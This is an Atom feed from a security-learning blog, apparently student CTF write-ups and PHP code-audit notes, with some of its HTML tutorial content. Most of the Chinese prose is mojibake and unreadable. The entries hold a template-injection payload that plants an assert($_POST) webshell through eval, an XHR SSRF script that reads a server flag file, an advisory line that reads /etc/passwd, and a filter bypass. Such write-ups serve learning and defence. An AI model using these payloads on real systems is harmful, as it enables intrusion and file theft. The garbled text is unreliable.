<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Î‘Î¹ÏÎ½Î¹Î¿Ï‚</title>
  
  <subtitle>The value of life lies not length of days, but in the use of we make of them.</subtitle>
  <link href="http://daweitech.github.io/atom.xml" rel="self"/>
  
  <link href="http://daweitech.github.io/"/>
  <updated>2021-09-21T12:39:43.804Z</updated>
  <id>http://daweitech.github.io/</id>
  
  <author>
    <name>4v1d</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CISCN2019 ååŒ—èµ›åŒº Day1 Web2 ikun</title>
    <link href="http://daweitech.github.io/2021/09/21/buu/22/"/>
    <id>http://daweitech.github.io/2021/09/21/buu/22/</id>
    <published>2021-09-21T12:26:05.000Z</published>
    <updated>2021-09-21T12:39:43.804Z</updated>
    
    <content type="html"><![CDATA[<p> ç»å†äº†ä¸€ä¸ªä¸ŠåˆAWDçš„è¢«é”¤å</p><p>æœ‰ç‚¹å¿ƒç°æ„å†·</p><p>åšäº†å¥½å¤šé¢˜ç›®éƒ½æ˜¯è·Ÿç€wpåšçš„ï¼Œæ²¡æœ‰ä»€ä¹ˆæ”¶è·</p><p>æœ¬æ¥æ‰¾äº†ly0nå¤§ä½¬å–ç»äº†ä¸€ä¸‹ï¼Œç»“æœå‘ç°è‡ªå·±è¿˜æ˜¯åŸºç¡€æ²¡æ‰“å¥½</p><p>è¿™é“é¢˜è¿˜æ˜¯è·Ÿç€wpåšäº†ä¸€é</p><p>å…ˆè®°å½•ä¸€ä¸‹æ€è·¯</p><p>è¿›å»ä¹‹åæ˜¯ä¸ªè´­ç‰©é¡µé¢ï¼Œå¾ˆå¤š* li *liæ ‡å¿—å°ç”µè§†çš„å•†å“</p><p>æŒ‰ç…§æç¤ºï¼Œæˆ‘ä»¬éœ€è¦ä¹°lv6çš„æ‰è¡Œ</p><p>ç¿»é¡µå¯»æ‰¾äº†å¥½ä¹…éƒ½æ²¡æœ‰</p><p>åŸç†æ˜¯è¦ç”¨è„šæœ¬è·‘ä¸€ä¸‹å•Š</p><p>å¾ˆå¿«ï¼Œæ‰¾åˆ°äº†ç¬¬180é¡µæœ‰è¿™ä¸ªå•†å“</p><p>ä½†æ˜¯å¤ªè´µäº†ï¼Œè¿œè¿œè¶…å‡ºæˆ‘ä»¬çš„é’±åŒ…</p><p>äºæ˜¯æŠ“åŒ…æƒ³ä¿®æ”¹æŠ˜æ‰£è’™æ··è¿‡å…³</p><p>å¥½å®¶ä¼™ï¼Œè¯´æ²¡æœ‰ä»¥adminè®¿é—®ä¸è¡Œ</p><p>ç„¶åçŸ¥é“äº†è¦ä»jwtå…¥æ‰‹ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªæœ‰ç‚¹åƒä»¤ç‰Œtokenå’Œcookieå§</p><p>å°±æ˜¯æµè§ˆå™¨ç”¨è¿™ä¸ªä¸œè¥¿æ¥è¯†åˆ«ä½ çš„èº«ä»½</p><p>è¿›å…¥jwtå®˜æ–¹é¡µé¢ä¿®æ”¹ä¹‹åæˆåŠŸè´­ä¹°</p><p>æŸ¥çœ‹æºç </p><p>æç¤ºæˆ‘ä»¬ä¸‹è½½æ–‡ä»¶</p><p>ä¸‹è½½ä¹‹åå°±æ˜¯éš¾ç‚¹pythonçš„pickleæ¼æ´</p><p><strong>æ¼æ´äº§ç”Ÿçš„åŸå› åœ¨äºå…¶å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ååºåˆ—åŒ–åäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘<strong>reduce</strong>()å‡½æ•°ä»è€Œè§¦å‘æ¶æ„ä»£ç ã€‚</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; ç»å†äº†ä¸€ä¸ªä¸ŠåˆAWDçš„è¢«é”¤å&lt;/p&gt;
&lt;p&gt;æœ‰ç‚¹å¿ƒç°æ„å†·&lt;/p&gt;
&lt;p&gt;åšäº†å¥½å¤šé¢˜ç›®éƒ½æ˜¯è·Ÿç€wpåšçš„ï¼Œæ²¡æœ‰ä»€ä¹ˆæ”¶è·&lt;/p&gt;
&lt;p&gt;æœ¬æ¥æ‰¾äº†ly0nå¤§ä½¬å–ç»äº†ä¸€ä¸‹ï¼Œç»“æœå‘ç°è‡ªå·±è¿˜æ˜¯åŸºç¡€æ²¡æ‰“å¥½&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜è¿˜æ˜¯è·Ÿç€wpåšäº†ä¸€é&lt;/p&gt;
&lt;p&gt;å…ˆè®°å½•ä¸€ä¸‹æ€è·¯&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>phpä»£ç å®¡è®¡(ä¸‰)</title>
    <link href="http://daweitech.github.io/2021/09/17/src/3/"/>
    <id>http://daweitech.github.io/2021/09/17/src/3/</id>
    <published>2021-09-17T12:20:23.000Z</published>
    <updated>2021-09-17T12:37:47.373Z</updated>
    
    <content type="html"><![CDATA[<p> è¿™æ¬¡è¯•ç€å°è¯•å®¡è®¡bluecmsæ¼æ´</p><p>å®‰è£…bluecmsçš„æ•™ç¨‹æ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/qq_41209264/article/details/106773255">æ¸—é€æµ‹è¯•â€”â€”bluecmså®‰è£…åŠseayä»£ç å®¡è®¡_fallingskies-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/wkzb/p/12732078.html">phpä»£ç å®¡è®¡]bluecms v1.6 sp1 - beiwo - åšå®¢å›­ (cnblogs.com)</a></p><p>é‡åˆ°çš„ä¸€ä¸ªå°å‘å°±æ˜¯è®¿é—®å®‰è£…é¡µé¢ä¸€ç›´ä¸ºç©ºç™½ï¼Œè¿˜å¥½è§£å†³å•¦</p><p>ä¸Šé¢çš„æ–‡ç« å·²ç»è®²è§£å¾—å¾ˆè¯¦ç»†äº†</p><p><img src="/2021/09/17/src/3/image-20210917202058053.png" alt="image-20210917202058053"></p><p>åˆ›å»ºæˆåŠŸå›¾å¦‚ä¸‹ï¼š</p><p><img src="/2021/09/17/src/3/image-20210917202743734.png" alt="image-20210917202743734"></p><p>è·Ÿç€å¤§ä½¬æ–‡ç« é˜…è¯»ï¼š</p><p>[<a href="https://www.cnblogs.com/wkzb/p/12732078.html">phpä»£ç å®¡è®¡]bluecms v1.6 sp1 - beiwo - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; è¿™æ¬¡è¯•ç€å°è¯•å®¡è®¡bluecmsæ¼æ´&lt;/p&gt;
&lt;p&gt;å®‰è£…bluecmsçš„æ•™ç¨‹æ–‡ç« ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_41209264/article/details/106773255&quot;&gt;æ¸—é€æµ‹è¯•â€”â€”bluecmså®‰è£…åŠse</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>æ¼æ´æŒ–æ˜æ¼”ç»ƒ(ä¸€)</title>
    <link href="http://daweitech.github.io/2021/09/17/src/2/"/>
    <id>http://daweitech.github.io/2021/09/17/src/2/</id>
    <published>2021-09-17T07:14:27.000Z</published>
    <updated>2021-09-17T12:38:27.457Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥ä¸‹å†…å®¹å…¨éƒ¨æ¥è‡ªäºï¼šå®‰æ’ä¿¡æ¯</p><p>å…³äºcmsçš„æºç </p><p><img src="/2021/09/17/src/2/image-20210917152538626.png" alt="image-20210917152538626"></p><p>gitee.comä¸Šå¯ä»¥æ‰¾åˆ°å¾ˆå¤šèµ„æº</p><p>åŒæ ·githubä¹Ÿæ˜¯ã€‚</p><p>ä¾‹å­ä¸€ï¼š</p><p><img src="/2021/09/17/src/2/image-20210917153534213.png" alt="image-20210917153534213"></p><p>è§‚å¯Ÿä»¥ä¸Šä»£ç ï¼Œå‘ç°è¯¥phpæ–‡ä»¶æ˜æ˜¾æ˜¯è¯¥CMSçš„æ¨¡æ¿æ¸²æŸ“æ ¸å¿ƒä»£ç </p><p>å…¶ä¸­ï¼Œå¯¹å¤–è°ƒç”¨paser_stringå‡½æ•°ï¼Œæ ¸å¿ƒå‡½æ•°è¿è¡Œâ€”â€”parse,å¯¹å„ç§æ ‡ç­¾è¿›è¡Œè§£æã€‚</p><p>æ‰€ä»¥è”æƒ³åˆ°æ¨¡æ¿æ¸²æŸ“å¸¸å­˜åœ¨çš„SSTIæ¼æ´</p><p><img src="/2021/09/17/src/2/image-20210917153916987.png" alt="image-20210917153916987"></p><p>çœ‹åˆ°åœ¨å¤„ç†æ ‡ç­¾æ—¶è¿ç”¨è¯¸å¤ševal()å‡½æ•°</p><p>æ‰€ä»¥æ¥ä¸‹æ¥æ€è·¯ä¸ºï¼š</p><p>æ ¹æ®eval()å‡½æ•°ï¼Œè¿½è¸ªæº¯æºï¼Œçœ‹æ˜¯å¦å­˜åœ¨å¯æ§å˜é‡ã€‚</p><p>psï¼šæ²¡æœ‰å®¡è®¡ç»éªŒçš„äººï¼Œå»ºè®®æŠŠå…³é”®å‡½æ•°æå–å‡ºæ¥åˆ°æœ¬åœ°çš„PHPç¯å¢ƒè¿›è¡Œdebugè°ƒè¯•</p><p>ä¸»è¦æƒ³æ³•å°±æ˜¯ä¼ é€’ä»€ä¹ˆæ ·çš„å‚æ•°å¯ä»¥åœ¨evalä¸­æ‰§è¡Œï¼Œå¹¶ä¸”ç¡®å®ševalä¸­æ‰§è¡Œçš„ä»£ç æ˜¯å“ªä¸€å—ï¼Œæ˜¯å¦å¯æ§ã€‚</p><p>å‡è®¾ä¼ é€’{if:123}456{endif}</p><p>æ ¹æ®é€»è¾‘æ¨æ•²ï¼Œæœ€åä»£ç å›è¿›å…¥åˆ°è¯¥åˆ†æ”¯ä¸­</p><p>å¹¶ä¸”$strlfçš„å€¼æ˜¯123</p><p><img src="/2021/09/17/src/2/image-20210917154659350.png" alt="image-20210917154659350"></p><p>æ‰€ä»¥æœ€åèƒ½å¤Ÿæ„æˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(123)&#123;isFlag&#x3D;true;&#125;else&#123;isFalse&#125;;</span><br></pre></td></tr></table></figure><p>æ¥ç€ï¼Œå°±æ˜¯æ³¨å…¥ä»£ç æ¥getshelläº†</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1&#125;assert($_POST[x];&#x2F;&#x2F;)123&#123;endif&#125;</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1&#125;assert($_POST[x];&#x2F;&#x2F;)&#123;isFlag&#x3D;true;&#125;else&#123;isFalse&#125;;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š1ä¸ºæ°¸çœŸæ¡ä»¶ï¼Œ//å°†åé¢çš„æ³¨é‡Šäº†</p><p>æœ€åå°±æ‰§è¡Œäº†assert($_POST[x]);</p><p>æˆ‘ä»¬ç»§ç»­æ‰¾ä¼ é€’å‚æ•°çš„åœ°æ–¹</p><p>åå‘è¿½è¸ªï¼Œè°ƒç”¨labelif()å‡½æ•°çš„æ˜¯_parse(),è€Œ _parseåªè¢«parse_stringè°ƒç”¨</p><p><img src="/2021/09/17/src/2/image-20210917155446820.png" alt="image-20210917155446820"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä»¥ä¸‹å†…å®¹å…¨éƒ¨æ¥è‡ªäºï¼šå®‰æ’ä¿¡æ¯&lt;/p&gt;
&lt;p&gt;å…³äºcmsçš„æºç &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/09/17/src/2/image-20210917152538626.png&quot; alt=&quot;image-20210917152538626&quot;&gt;&lt;/p&gt;
&lt;p&gt;gite</summary>
      
    
    
    
    
    <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>PHP and MySQL Web Development(äºŒ)</title>
    <link href="http://daweitech.github.io/2021/09/15/php/3/"/>
    <id>http://daweitech.github.io/2021/09/15/php/3/</id>
    <published>2021-09-15T13:19:28.000Z</published>
    <updated>2021-09-15T13:20:40.278Z</updated>
    
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>runoob.com-html(1)</title>
    <link href="http://daweitech.github.io/2021/09/13/web/0/"/>
    <id>http://daweitech.github.io/2021/09/13/web/0/</id>
    <published>2021-09-13T14:01:57.000Z</published>
    <updated>2021-09-14T08:38:25.388Z</updated>
    
    <content type="html"><![CDATA[<p>1.HTMLæ–‡æ¡£çš„åç¼€å</p><p>.html                .htm</p><p>2.å®ä¾‹è§£æ</p><p><img src="/2021/09/13/web/0/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; å£°æ˜ä¸º HTML5 æ–‡æ¡£</span><br><span class="line">&lt;html&gt; å…ƒç´ æ˜¯ HTML é¡µé¢çš„æ ¹å…ƒç´ </span><br><span class="line">&lt;head&gt; å…ƒç´ åŒ…å«äº†æ–‡æ¡£çš„å…ƒï¼ˆmetaï¼‰æ•°æ®ï¼Œå¦‚ &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; å®šä¹‰ç½‘é¡µç¼–ç æ ¼å¼ä¸º utf-8ã€‚</span><br><span class="line">&lt;title&gt; å…ƒç´ æè¿°äº†æ–‡æ¡£çš„æ ‡é¢˜</span><br><span class="line">&lt;body&gt; å…ƒç´ åŒ…å«äº†å¯è§çš„é¡µé¢å†…å®¹</span><br><span class="line">&lt;h1&gt; å…ƒç´ å®šä¹‰ä¸€ä¸ªå¤§æ ‡é¢˜</span><br><span class="line">&lt;p&gt; å…ƒç´ å®šä¹‰ä¸€ä¸ªæ®µè½</span><br></pre></td></tr></table></figure><p>HTML æ˜¯ç”¨æ¥æè¿°ç½‘é¡µçš„ä¸€ç§è¯­è¨€ã€‚</p><p>HTML æŒ‡çš„æ˜¯è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</p><p>HTMLæ ‡ç­¾</p><p>HTMLå…ƒç´ </p><p>HTMLç½‘é¡µç»“æ„</p><p><img src="/2021/09/13/web/0/image-20210913221500807.png" alt="image-20210913221500807"></p><p>æ–‡æ¡£æ ¼å¼ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;div&gt;åˆ†ç±»ç›®å½•...&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;å½“å‰åˆ†ç±»å†…å®¹åˆ—è¡¨...&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt; </span><br></pre></td></tr></table></figure><p>å¸¸ç”¨æ ‡ç­¾ä»‹ç»ï¼š</p><p>æ–‡æœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ€å¸¸ç”¨ï¼š&lt;font&gt;,ç”¨äºæ”¹å˜å­—ä½“ï¼Œå­—å·æ–‡å­—é¢œè‰²</span><br></pre></td></tr></table></figure><p>å›¾ç‰‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;hr&gt;æ ‡ç­¾ç”¨äºåœ¨é¡µé¢ä¸Šæ·»åŠ å›¾ç‰‡ï¼Œsrcå±æ€§æŒ‡å®šå›¾ç‰‡çš„åœ°å€ï¼Œå¦‚æœæ— æ³•æ‰“å¼€srcæŒ‡å®šçš„å›¾ç‰‡ï¼Œæµè§ˆå™¨é€šå¸¸ä¼šåœ¨é¡µé¢ä¸Šéœ€è¦æ˜¾ç¤ºå›¾ç‰‡çš„åœ°æ–¹æ˜¾ç¤ºaltå±æ€§å®šä¹‰çš„æ–‡æœ¬ã€‚</span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Icons&#x2F;valid-xhtml10&quot; alt&#x3D;&quot;å›¾ç‰‡ç®€ä»‹&quot; &#x2F;&gt; </span><br></pre></td></tr></table></figure><p>é“¾æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¶…çº§é“¾æ¥ç”¨&lt;a&gt;æ ‡ç­¾è¡¨ç¤ºï¼Œhrefå±æ€§æŒ‡å®šäº†é“¾æ¥åˆ°çš„åœ°å€ã€‚&lt;a&gt;æ ‡ç­¾å¯ä»¥åŒ…å«æ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥åŒ…å«å›¾ç‰‡ã€‚</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;&quot;&gt;èœé¸Ÿæ•™ç¨‹&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;validator.w3.org&quot;&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Icons&#x2F;valid-xhtml10&quot; alt&#x3D;&quot;éªŒè¯HTML&quot; &#x2F;&gt;&lt;&#x2F;a&gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.HTMLæ–‡æ¡£çš„åç¼€å&lt;/p&gt;
&lt;p&gt;.html                .htm&lt;/p&gt;
&lt;p&gt;2.å®ä¾‹è§£æ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/09/13/web/0/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg&quot;&gt;</summary>
      
    
    
    
    
    <category term="web" scheme="http://daweitech.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2021ç¥¥äº‘æ¯ secrets_of_admin&amp;crwaler_z</title>
    <link href="http://daweitech.github.io/2021/09/07/buu/21/"/>
    <id>http://daweitech.github.io/2021/09/07/buu/21/</id>
    <published>2021-09-07T02:52:39.000Z</published>
    <updated>2021-09-14T11:39:07.493Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/rfrder/article/details/119914746">ç¥¥äº‘æ¯2021 Webå¤ç°_fengçš„åšå®¢-CSDNåšå®¢</a></p><p>[ç¥¥äº‘æ¯2021 web wp | Z3ratu1â€™s blog](<a href="https://blog.z3ratu1.cn/%E7%A5%A5%E4%BA%91%E6%9D%AF2021">https://blog.z3ratu1.cn/ç¥¥äº‘æ¯2021</a> wp.html#more)</p><p><a href="https://cbatl.gitee.io/">ly0n - A hard-working boy (gitee.io)</a></p><p><a href="https://www.freebuf.com/articles/system/178150.html">Linuxä¸‹å‡ ç§åå¼¹Shellæ–¹æ³•çš„æ€»ç»“ä¸ç†è§£ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://www.wlhhlc.top/posts/20107/#cralwer-z">2021ç¥¥äº‘æ¯WEB-WP | dota_st (wlhhlc.top)</a></p><h4 id="secrets-of-admin"><a href="#secrets-of-admin" class="headerlink" title="secrets_of_admin"></a>secrets_of_admin</h4><p>æ‰“å¼€åé¡µé¢å¦‚ä¸‹ï¼š</p><p><img src="/2021/09/07/buu/21/image-20210908114725080.png" alt="image-20210908114725080"></p><p>database.jsé‡Œç›´æ¥ç»™å‡ºç”¨æˆ·åå’Œå¯†ç ï¼š</p><p>Usernameï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br></pre></td></tr></table></figure><p>Passwordï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</span><br></pre></td></tr></table></figure><p>ç™»å½•åå°±æœ‰äº†ä¸Šä¼ ç•Œé¢</p><p><img src="/2021/09/07/buu/21/image-20210908114945704.png" alt="image-20210908114945704"></p><p>æç¤ºæˆ‘ä»¬ä¸Šä¼ pdfç±»å‹çš„æ–‡ä»¶ï¼Œåˆåªèƒ½postä¼ å‚</p><p>ä»¥ä¸‹ç›´<code>files</code>è¡¨å¯ä»¥çŸ¥é“ï¼Œflagåœ¨<code>superuser</code>é‚£é‡Œï¼Œä½†æ˜¯<code>superuser</code>ä¸èƒ½ç”¨ã€‚é€šè¿‡ä¸‹é¢ä¸‰è¡Œä»£ç ä¹Ÿå¯ä»¥çŸ¥é“ï¼Œéœ€è¦æŠŠ<code>flag</code>ç»™<code>admin</code>ç”¨æˆ·æ¥æ‘˜æŠ„wpï¼ˆå› ä¸ºæˆ‘æ²¡æºç ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let filename &#x3D; await DB.getFile(token.username, req.params.id)</span><br><span class="line">         if (fs.existsSync(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)))&#123;</span><br><span class="line">             return res.send(await readFile(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯/api/files/åŠŸèƒ½é‚£é‡Œéœ€è¦SSRFã€‚</p><p>é€šè¿‡æŸ¥æ‰¾html-pdfåº“å‘ç°å®ƒå­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html-pdf before version 3.0.1 is vulnerable to Arbitrary File Read. The package fails to sanitize the HTML input, allowing attackers to exfiltrate server files by supplying malicious HTML code. XHR requests in the HTML code are executed by the server. Input with an XHR request such as request.open(&quot;GET&quot;,&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;) will result in a PDF document with the contents of &#x2F;etc&#x2F;passwd.</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥åˆ©ç”¨åˆ¶é€ pdfçš„åŠŸèƒ½æ¥å®ç°ssrfï¼ŒæŠŠflagç»™adminç”¨æˆ·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=1&quot;</span>, <span class="literal">true</span>);xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è€Œä¸”filenameå­—æ®µæ˜¯UNIQUEï¼Œéœ€è¦ä¸èƒ½ç›´æ¥flagï¼Œç”¨./flagã€‚</p><p>ä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯è¿™ä¸ªè¿‡æ»¤ï¼š</p><pre><code>if ( content == &#39;&#39; || content.includes(&#39;&lt;&#39;) || content.includes(&#39;&gt;&#39;) || content.includes(&#39;/&#39;) || content.includes(&#39;script&#39;) || content.includes(&#39;on&#39;))&#123;    // even admin can&#39;t be trusted right ? :)      return res.render(&#39;admin&#39;, &#123; error: &#39;Forbidden word ğŸ¤¬&#39;&#125;);&#125; else &#123;</code></pre><p>å½“æ—¶è‡ªå·±å°±å¡åœ¨äº†è¿™é‡Œï¼Œä¸çŸ¥é“æ€ä¹ˆç»•è¿‡ã€‚å…³é”®å°±åœ¨äºnode.jsçš„å¼±ç±»å‹å’Œphpçš„å¼±ç±»å‹æœ‰æ‰€ä¸åŒã€‚jsä¸­æ•°ç»„å’Œå­—ç¬¦ä¸²æ‹¼æ¥çš„è¯ï¼Œæ¯”å¦‚[â€œhelloâ€]+â€worldâ€ï¼Œå¾—åˆ°çš„æ˜¯helloworldï¼Œè€Œphpé‡Œç¡®å®Arrayworldã€‚ä¹Ÿæ˜¯å› ä¸ºæ·±å—phpçš„å½±å“ï¼Œæ‰€ä»¥æ²¡æƒ³åˆ°è¿™é‡Œå¯ä»¥ç”¨æ•°ç»„æ¥ç»•è¿‡ï¼Œè®°å¾—URLç¼–ç </p><p>ç„¶åæˆ‘æ˜¯ä¸¢è¿›bpé‡Œï¼Œåªéœ€è¦contentæ”¹æˆcontent[],ä¼ æ•°ç»„</p><p><img src="/2021/09/07/buu/21/image-20210908115802410.png" alt="image-20210908115802410"></p><p><img src="/2021/09/07/buu/21/image-20210908120122404.png" alt="image-20210908120122404"></p><p>å‡ºç°è¿™ä¸ªé¡µé¢å°±æ˜¯æˆåŠŸ</p><p><img src="/2021/09/07/buu/21/image-20210908120634020.png" alt="image-20210908120634020"></p><p>æ‰“å¼€åå°±æœ‰flag</p><p><img src="/2021/09/07/buu/21/image-20210908120715884.png" alt="image-20210908120715884"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/rfrder/article/details/119914746&quot;&gt;ç¥¥äº‘æ¯2021 Webå¤ç°_fengçš„åšå®¢-CSDNåšå®¢&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[ç¥¥äº‘æ¯2021 web wp | Z3ratu1â€™s blog</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>phpä»£ç å®¡è®¡(ä¸‰)</title>
    <link href="http://daweitech.github.io/2021/09/05/php/2/"/>
    <id>http://daweitech.github.io/2021/09/05/php/2/</id>
    <published>2021-09-05T12:48:43.000Z</published>
    <updated>2021-09-05T13:04:00.433Z</updated>
    
    <content type="html"><![CDATA[<p> è¿™æ˜¯ä¸€æ¬¡å¯¹å•ç‹¬æ–‡ç« çš„åˆ†æ</p><p>æ¥è‡ªäºå®‰å…¨å®¢ï¼š</p><p><a href="https://www.anquanke.com/post/id/250537">ThinkPHP 3.2.3 æ¼æ´å¤ç° - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; è¿™æ˜¯ä¸€æ¬¡å¯¹å•ç‹¬æ–‡ç« çš„åˆ†æ&lt;/p&gt;
&lt;p&gt;æ¥è‡ªäºå®‰å…¨å®¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/250537&quot;&gt;ThinkPHP 3.2.3 æ¼æ´å¤ç° - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)&lt;/a&gt;</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>ç½‘é¼æ¯ 2020 æ€»å†³èµ› Novel&amp;GameExp</title>
    <link href="http://daweitech.github.io/2021/09/04/buu/20/"/>
    <id>http://daweitech.github.io/2021/09/04/buu/20/</id>
    <published>2021-09-04T07:24:15.000Z</published>
    <updated>2021-09-07T12:35:03.912Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Novel"><a href="#Novel" class="headerlink" title="Novel:"></a>Novel:</h4><p>å‚è€ƒåšå®¢ï¼š</p><p><a href="https://www.cnblogs.com/W4nder/p/14078695.html">ç½‘é¼æ¯2020çº¿ä¸‹web - W4nder - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://mount4in.github.io/2020/12/08/2020%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEwriteup/">2020ç¬¬äºŒå±Šç½‘é¼æ¯åŠå†³èµ›Webé¢˜ç›®writeup | Mount4in</a></p><p>åœ¨buuä¸Šä¸‹è½½äº†æºæ–‡ä»¶</p><p><img src="/2021/09/04/buu/20/image-20210905094734716.png" alt="image-20210905094734716"></p><p>å…ˆçœ‹çœ‹index.php</p><p>æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 